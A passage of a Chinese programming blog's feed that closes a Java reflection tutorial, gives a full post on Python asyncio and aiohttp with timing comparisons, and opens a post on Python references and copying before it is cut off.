class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Dog</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Dog</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Bird</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">int</span> id;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">Bird</span><span class="params">(<span class="keyword">int</span> id)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setId</span><span class="params">(<span class="keyword">int</span> id)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.id = id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> id;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这两个类区别在于构造器分别是public和private。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"></span><br><span class="line">        Class cls = Class.forName(<span class="string">"model.Dog"</span>);</span><br><span class="line">        Constructor constructor = cls.getConstructor(<span class="keyword">int</span>.class);</span><br><span class="line">        Object o  = constructor.newInstance(<span class="number">100</span>);</span><br><span class="line">        Method method = cls.getMethod(<span class="string">"getId"</span>);</span><br><span class="line">        System.out.println(method.invoke(o));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Class cls1  = Class.forName(<span class="string">"model.Bird"</span>);</span><br><span class="line">        Constructor constructor1 = cls1.getDeclaredConstructor(<span class="keyword">int</span>.class);</span><br><span class="line">        constructor1.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object o1 = constructor1.newInstance(<span class="number">101</span>);</span><br><span class="line">        System.out.println(cls1.getMethod(<span class="string">"getId"</span>).invoke(o1));</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>获取构造器分别使用getConstructor与getDeclaredConstructor来获取公有和私有的构造器，而构造器的newInstance方法则是用来创建带参数的类的实例。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这篇文章差不多讲了Java反射的入门知识，学习了Class类与反射的基本知识。不同于new，反射可以在需要的时候动态加载类。尽管在开发中反射并不常见，但了解反射的思想有助于对框架源码的解读。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="http://tengj.top/2016/04/28/javareflect/" target="_blank" rel="noopener">http://tengj.top/2016/04/28/javareflect/</a><br><a href="https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html" target="_blank" rel="noopener">https://www.cnblogs.com/chanshuyi/p/head_first_of_reflection.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;这篇文章鸽了好久，拖稿了好几天，趁着有精力的时候多写写文章。Java语言一直被我认为是常见语言中最难的语言，主要是概念繁多，然后就是JVM的
      
    
    </summary>
    
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="java" scheme="http://re0.top/tags/java/"/>
    
  </entry>
  
  <entry>
    <title>浅谈python异步编程</title>
    <link href="http://re0.top/2020/03/11/python-sync/"/>
    <id>http://re0.top/2020/03/11/python-sync/</id>
    <published>2020-03-11T06:20:00.000Z</published>
    <updated>2020-03-12T09:39:47.496Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近开发的公众号后台需要有一个比较费时的检索操作，向某api接口请求数据，但接口返回时间不定，公众号又规定必须在5秒之内返回，不然会重发三次请求，还是无响应则显示公众号故障。由于公众号没有认证，无法主动给用户发送消息，所以我想了两天，想了几种解决方案：<br>1.直接使用requests的timeout，超过4秒的请求直接返回无结果，但是这对用户的体验很不友好。<br>2.超时之后返回“正在请求”，并继续将结果缓存到redis中，等下次用户请求相同数据时，直接从redis中返回，无需后端再向接口请求。<br>基于第二种方法，第一时间我想到的是异步编程，使用异步的http客户端请求接口，超时则返回，但请求依旧在进行，直到将结果缓存到redis中。<br>但是结果却出乎我的意料，在async函数1中await另一个async函数2，如果1已经返回，则2是强制被取消，原因大概是已经退出了事件循环，导致无法继续运行。<br>虽然最后没有用异步编程解决办法，但是还是重学一下python中的异步编程，梳理一下知识。</p><h1 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h1><p>异步编程中有许多概念，例如同步，异步，阻塞和非阻塞。我从网上找了许多解释，并加入了自己的理解。</p><h2 id="同步与异步"><a href="#同步与异步" class="headerlink" title="同步与异步"></a>同步与异步</h2><p>同步与异步最大的差别在与返回的结果是否立即返回，他们的关注点是消息的通信机制。举个例子：<br>假如函数1调用函数2，如果采用同步方式，则1要等待2返回结果后，才能返回。<br>而如果采用异步方式，则1无需关注2返回结果，继续运行，直到2返回后通过例如回调函数，通知等方式处理结果或通知调用者1完成了本次调用。<br>简单一点说，就是同步是调用者<strong>主动等待</strong>被调用者的结果，而异步则是被调用者<strong>主动通知</strong>调用者结果。</p><h2 id="阻塞与非阻塞"><a href="#阻塞与非阻塞" class="headerlink" title="阻塞与非阻塞"></a>阻塞与非阻塞</h2><p>这两个的关注点在于程序在等待调用结果时所在的状态。<br>阻塞调用是指在结果返回前，当前线程将被挂起。而调用线程只有在得到结果后才返回。<br>非阻塞调用是不能立即得到结果之前，该调用不会阻塞当前线程。还是举个简单例子：<br>如果是阻塞调用，则调用者会将自己挂起，不做其他事，直到得到调用结果。<br>而如果是非阻塞调用，则调用者可以做其他事情，但每隔一段时间就会查看是否得到调用结果。<br>所以同步通信可以阻塞也可以非阻塞。在编程中我们常见的逻辑基本上是同步阻塞的。这样逻辑较为清楚。</p><h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="asyncio"><a href="#asyncio" class="headerlink" title="asyncio"></a>asyncio</h2><p>python之父用了好几年的时间才将asyncio库编写完成，可见异步编程是值得这么做的。python中可以实现多线程和多进程，很多人认为有这两个就没有特别必要实现异步，但是多线程存在着许多问题，例如竞争，锁等问题，导致处理十分麻烦。基于这点python3.4加入了asyncio模块，加入了异步编程，并在3.7中加入了async与await关键字。<br>这个异步模块特点在于只有一个线程，这一点与JavaScript相同。由于只有一个线程，所以asyncio 是”多任务合作”模式（cooperative multitasking），即允许任务交出执行权给其他任务，等待其他任务完成后回收执行权。其实就是分享运行时间。<br>这样虽然没有合理使用多线程多进程来充分利用CPU，但代码逻辑清晰，符合编程思维。<br>asyncio在单线程中启动一个事件循环（event loop）时刻监听进入循环的事件，处理，重复过程，直到异步任务结束，而事件循环与<a href="https://wangdoc.com/javascript/async/general.html" target="_blank" rel="noopener">JavaScript的模型</a>相同。</p><h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p>协程又叫微线程，Coroutine，协程的作用是可以随时中断去执行其他操作，虽然像是多线程，但协程只有一个线程在运行。其优点有：</p><ul><li>执行效率极高，因为子程序切换（函数）不是线程切换，由程序自身控制，没有切换线程的开销。所以与多线程相比，线程的数量越多，协程性能的优势越明显。</li><li>不需要多线程的锁机制，因为只有一个线程，也不存在同时写变量冲突，在控制共享资源时也不需要加锁，因此执行效率高很多。</li></ul><p>一个简单的demo(来自官方文档)：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">()</span>:</span></span><br><span class="line">    print(<span class="string">"hello"</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">"world"</span>)</span><br><span class="line">asyncio.run(func1())</span><br></pre></td></tr></table></figure><br>这个例子中，先打印了hello隔了一秒钟后打印world。<br>在asyncio中，提供了三种方式运行协程</p><ol><li>asyncio.run() 函数用来运行最高层级的入口点</li><li>等待一个协程，也就是await关键字。</li><li>asyncio.create_task() 函数用来<strong>并发</strong>运行作为 asyncio 任务的多个协程。</li></ol><h2 id="Future-对象"><a href="#Future-对象" class="headerlink" title="Future 对象"></a>Future 对象</h2><p>Future较为少用，因为这个比较底层，表示的是一个异步操作的结果。在Java中也有Future，在python的官方文档中讲的也不是很多，这里不过多讲述。</p><h2 id="任务"><a href="#任务" class="headerlink" title="任务"></a>任务</h2><p>如上面第三个方式，任务是Future的子类，用来的是并发执行协程<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">func1</span><span class="params">(delay)</span>:</span></span><br><span class="line"><span class="keyword">await</span> asyncio.sleep(delay)</span><br><span class="line">print(delay)</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    task1 = asyncio.create_task(</span><br><span class="line">        func1(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">    task2 = asyncio.create_task(</span><br><span class="line">        func1(<span class="number">2</span>))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">f"started at <span class="subst">&#123;time.strftime(<span class="string">'%X'</span>)&#125;</span>"</span>)</span><br><span class="line">    <span class="keyword">await</span> task1</span><br><span class="line">    <span class="keyword">await</span> task2</span><br><span class="line">    print(<span class="string">f"finished at <span class="subst">&#123;time.strftime(<span class="string">'%X'</span>)&#125;</span>"</span>)</span><br><span class="line">asyncio.run(main())</span><br></pre></td></tr></table></figure></p><p>这段代码等待的时间并不是3秒，而是2秒，因为task1和task2是并发执行。<br>在文档中还提到另一个并发执行任务的函数，asyncio.gather，那么它与create_task又有什么区别？<br>create_task将协程交给事件循环，返回task，并且可以通过cancel()取消任务。<br>而asyncio.gather用于你需要获得协程的结果，它返回的是各自的结果的列表。如果其中一个协程发生异常，则引发异常。</p><h2 id="同步与异步对比"><a href="#同步与异步对比" class="headerlink" title="同步与异步对比"></a>同步与异步对比</h2><p>这里要说的一点是time.sleep与asyncio.sleep的差别，time.sleep是阻塞的，而asyncio.sleep是非阻塞的。在异步方法中使用time.sleep会使整个线程阻塞。asyncio.sleep返回的是一个future对象，可等待。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#同步示例</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        hello()</span><br><span class="line">        print(<span class="string">'Hello World:%s'</span> % time.time())</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hello World:1583993483.900457</span></span><br><span class="line"><span class="comment">#Hello World:1583993484.9013405</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#异步示例</span></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    asyncio.sleep(<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Hello World:%s'</span> % time.time())</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>):</span><br><span class="line">        <span class="keyword">await</span> hello()</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.run(main())</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hello World:1583994087.0926125</span></span><br><span class="line"><span class="comment">#Hello World:1583994087.0926125</span></span><br></pre></td></tr></table></figure><p>这里要说的是，如果asyncio.sleep前加入await，则异步函数hello会等待sleep结束才继续输出，不加await会报warning，但是不影响运行。</p><h2 id="异步http"><a href="#异步http" class="headerlink" title="异步http"></a>异步http</h2><p>基于以上的代码可以知道，异步操作其实是就是将耗时操作异步化，使得代码运行时间缩短。<br>在爬虫中如果需要大量的请求，并且要缩短时间，通常使用异步的http客户端进行爬取。由于requests库是同步的，在请求的时候会阻塞，所以requests不支持异步操作，通常我们会使用grequests和aiohttp等库，这里我们使用aiohttp。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"></span><br><span class="line">url = <span class="string">"https://www.example.com/"</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            response = <span class="keyword">await</span> response.read()</span><br><span class="line">            print(response)</span><br><span class="line">     </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    asyncio.run(hello())</span><br></pre></td></tr></table></figure><br>response.read()是一个耗时的io操作，前面加上await关键字等待响应。</p><h2 id="多链接同步请求与异步请求对比"><a href="#多链接同步请求与异步请求对比" class="headerlink" title="多链接同步请求与异步请求对比"></a>多链接同步请求与异步请求对比</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time,asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://www.qq.com"</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            response = <span class="keyword">await</span> response.read()</span><br><span class="line">     </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello2</span><span class="params">()</span>:</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        r = requests.get(url)</span><br><span class="line">        response = r.text</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        task = asyncio.create_task(hello())</span><br><span class="line">        tasks.append(task) </span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    print(<span class="string">"start time at &#123;&#125;"</span>.format(time.strftime(<span class="string">"%X"</span>)))</span><br><span class="line">    hello2()</span><br><span class="line">    print(<span class="string">"end time at &#123;&#125;"</span>.format(time.strftime(<span class="string">"%X"</span>)))</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"start time at &#123;&#125;"</span>.format(time.strftime(<span class="string">"%X"</span>)))</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    print(<span class="string">"end time at &#123;&#125;"</span>.format(time.strftime(<span class="string">"%X"</span>)))</span><br><span class="line"><span class="comment">#start time at 16:59:05</span></span><br><span class="line"><span class="comment">#end time at 16:59:12</span></span><br><span class="line"><span class="comment">#start time at 16:59:12</span></span><br><span class="line"><span class="comment">#end time at 16:59:12</span></span><br></pre></td></tr></table></figure><p>可以发现使用异步操作爬取页面速度非常之快。</p><h2 id="使用同一个ClientSession"><a href="#使用同一个ClientSession" class="headerlink" title="使用同一个ClientSession"></a>使用同一个ClientSession</h2><p>而aiohttp文档中建议使用单个ClientSession，而不是每次连接都重新创建一个对象。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests,time,asyncio</span><br><span class="line"><span class="keyword">from</span> aiohttp <span class="keyword">import</span> ClientSession</span><br><span class="line">url = <span class="string">"http://www.qq.com"</span></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">            response = <span class="keyword">await</span> response.read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    tasks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">        task = asyncio.create_task(hello())</span><br><span class="line">        tasks.append(task) </span><br><span class="line">    <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">hello1</span><span class="params">(session)</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> session.get(url) <span class="keyword">as</span> response:</span><br><span class="line">        response = <span class="keyword">await</span> response.read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="function"><span class="keyword">def</span> <span class="title">main2</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">async</span> <span class="keyword">with</span> ClientSession() <span class="keyword">as</span> session:</span><br><span class="line">        tasks = []</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">            task = asyncio.create_task(hello1(session))</span><br><span class="line">            tasks.append(task)</span><br><span class="line">        <span class="keyword">await</span> asyncio.wait(tasks)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line">    start = time.time()</span><br><span class="line">    asyncio.run(main())</span><br><span class="line">    print(time.time() - start)</span><br><span class="line"></span><br><span class="line">    start = time.time()</span><br><span class="line">    asyncio.run(main2())</span><br><span class="line">    print(time.time() - start)</span><br></pre></td></tr></table></figure><br>这次我们使用了同一个ClientSession()，在测试了30，100，500，1000个请求后发现，使用同一个session速度略快一些，大概是两倍左右。</p><h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>学了几天基础的python异步编程，对异步编程又有了新的理解，学习了异步爬虫的基本原理，曾经使用过的scrapy框架，现在能够理解它对异步的支持。<br>虽然没有解决开发上的问题，但还是收获很多。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;最近开发的公众号后台需要有一个比较费时的检索操作，向某api接口请求数据，但接口返回时间不定，公众号又规定必须在5秒之内返回，不然会重发三次
      
    
    </summary>
    
    
      <category term="编程" scheme="http://re0.top/tags/%E7%BC%96%E7%A8%8B/"/>
    
      <category term="python" scheme="http://re0.top/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>浅谈python中的引用与拷贝</title>
    <link href="http://re0.top/2020/03/04/python-copy/"/>
    <id>http://re0.top/2020/03/04/python-copy/</id>
    <published>2020-03-04T06:20:00.000Z</published>
    <updated>2020-03-04T08:19:56.977Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>最近在爬取某游戏攻略的时候，发现写入到json的文件中全是重复的字典，但是数据库中的数据却是正常的，在寻找了一段时间的bug后，想起来python中对赋值操作本质上是对象的引用，而不是复制对象，所以将字典”复制”后append到list中，只要这个字典发生变化，整个list中的字典都是一样的值。心血来潮，重新学习一下引用与拷贝。</p><h1 id="问题复现"><a href="#问题复现" class="headerlink" title="问题复现"></a>问题复现</h1><p>类似代码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">dict1 = &#123;&apos;type_a&apos;:&apos;&apos;,&apos;type_b&apos;:&apos;&apos;&#125;</span><br><span class="line">all_list = []</span><br><span class="line">for i in range(2):</span><br><span class="line">    new_dict = dict1</span><br><span class="line">    new_dict[&apos;type_a&apos;] = i</span><br><span class="line">    new_dict[&apos;type_b&apos;] = i+10</span><br><span class="line">    all_list.append(new_dict)</span><br><span class="line">print(all_list) #[&#123;&apos;type_a&apos;: 1, &apos;type_b&apos;: 11&#125;, &#123;&apos;type_a&apos;: 1, &apos;type_b&apos;: 11&#125;]</span><br></pre></td></tr></table></figure><br>为什么会出现这样的问题，原因在于new_dict引用了dict1的内存地址，本质上两个变量指向的是同一个内存地址，并且list的append本质上也是对对象的引用。<br>使用id函数查看变量指向的内存地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(id(dict1)) #1584039349560</span><br><span class="line">print(id(new_dict)) #1584039349560</span><br></pre></td></tr></table></figure><br>可以发现两个字典的内存地址相同，那么解决办法很简单，<br>1.直接让new_dict = {},相当于建立的一个新的字典，这样两个变量之间就没有关系。<br>2.使用dict中的copy方法或者使用标准库中copy.copy，将dict1的对象复制过来(不是引用)。这两种办法都可以解决对象重复的问题，我刚开始之所以那么写，主要原因是字典的属性直观一点，java代码写多了，就不自觉的想要new一个对象，哈哈。</p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>虽然解决了问题，但是学习还没完，那么python中的引用究竟是怎么一回事？在python中，无论什么数据类型，都是按照引用进行赋值的。变量名和变量的真实值是分开保存的，变量名中保存的是真实值的一个指针，对变量赋值时，也是将这个指针赋值给新变量。<br>在python中有三类不可变型，数值型，字符串型，元祖，其他的都属于可变型，如字典，列表。<br>所谓不可变型，就是我们无法在内存中修改这个变量，如果尝试修改，则会断开对前一个对象的引用，重新分配内存地址。而可变型则是不会断开前一个对象的引用。例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 